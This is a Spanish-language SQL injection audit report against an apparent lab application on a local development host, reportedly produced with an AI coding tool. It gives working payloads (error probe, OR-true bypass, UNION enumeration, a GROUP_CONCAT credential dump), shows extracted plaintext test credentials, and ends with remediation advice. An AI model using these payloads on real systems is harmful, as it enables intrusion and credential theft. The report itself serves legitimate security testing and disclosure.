# Informe de Auditoría de Seguridad – SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:19:40  
**Herramienta:** GitHub Copilot CLI (claude-sonnet-4.6)

---

## 1. Resumen Ejecutivo

Se detectó y explotó exitosamente una vulnerabilidad de **SQL Injection clásica (error-based / UNION-based)** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió extraer credenciales de todos los usuarios de la base de datos.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (CWE-89) |
| **Severidad** | Crítica |
| **Parámetro afectado** | `id` (GET) |
| **URL** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Base de datos** | MariaDB 10.11.14 |
| **CVSS estimado** | 9.8 (Crítico) |

### Causa raíz
La aplicación concatena directamente el valor del parámetro `id` en la consulta SQL sin sanitización ni uso de sentencias preparadas (prepared statements). El código vulnerable en `/var/www/html/low.php` ejecuta una consulta del tipo:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '<INPUT>'
```

---

## 3. Pruebas de Concepto

### 3.1 Detección – Error SQL
**Payload:** `1'`  
**Respuesta:** Error de sintaxis SQL expuesto en la respuesta HTTP:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version...
SELECT first_name... near ''1'''
```

### 3.2 Bypass de autenticación / extracción masiva
**Payload:** `1' OR '1'='1'-- -`  
**Resultado:** Se retornaron todos los registros de la tabla `users` (8 usuarios).

### 3.3 UNION-based – Enumeración del sistema
**Payload:** `0' UNION SELECT version(),database()-- -`  
**Resultado:**
- Versión DBMS: `10.11.14-MariaDB-ubu2204`
- Base de datos activa: `sqli_demo`
- Usuario de BD: `root@172.18.0.3`
- Directorio de datos: `/var/lib/mysql/`

### 3.4 Extracción de estructura
**Tablas en `sqli_demo`:** `users`  
**Columnas en `users`:** `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

### 3.5 Extracción de credenciales
**Payload:**
```
0' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR '|'),email FROM users-- -
```

**Credenciales extraídas:**

| Usuario | Contraseña |
|---------|-----------|
| admin | password123 |
| jsmith | secret456 |
| bjohnson | mypass789 |
| awilliams | qwerty123 |
| cbrown | password |
| ddavis | secure123 |
| emiller | hackme |
| fwilson | admin123 |

---

## 4. Impacto

- **Confidencialidad:** Exposición total de credenciales y datos de usuarios.
- **Integridad:** Posibilidad de modificar o eliminar datos de la base de datos.
- **Disponibilidad:** Potencial denegación de servicio mediante consultas destructivas.
- **Escalada:** El usuario de base de datos es `root`, lo que podría permitir lectura/escritura de archivos del sistema mediante `LOAD_FILE()` / `INTO OUTFILE`.

---

## 5. Recomendaciones

1. **Usar sentencias preparadas (Prepared Statements)** con parámetros vinculados:
   ```php
   $stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("s", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea numérico antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos no debe ser `root`; debe tener permisos estrictamente necesarios (solo SELECT en tablas requeridas).

4. **Deshabilitar mensajes de error detallados** en producción para no exponer trazas de stack ni queries SQL.

5. **Implementar WAF** (Web Application Firewall) como capa adicional de protección.

6. **Hashear contraseñas** en la base de datos usando algoritmos seguros (bcrypt, Argon2).

---

## 6. Conclusión

La aplicación es vulnerable a SQL Injection de nivel crítico. La explotación fue completamente exitosa, permitiendo la extracción de todas las credenciales almacenadas en texto plano. Se requiere corrección inmediata.
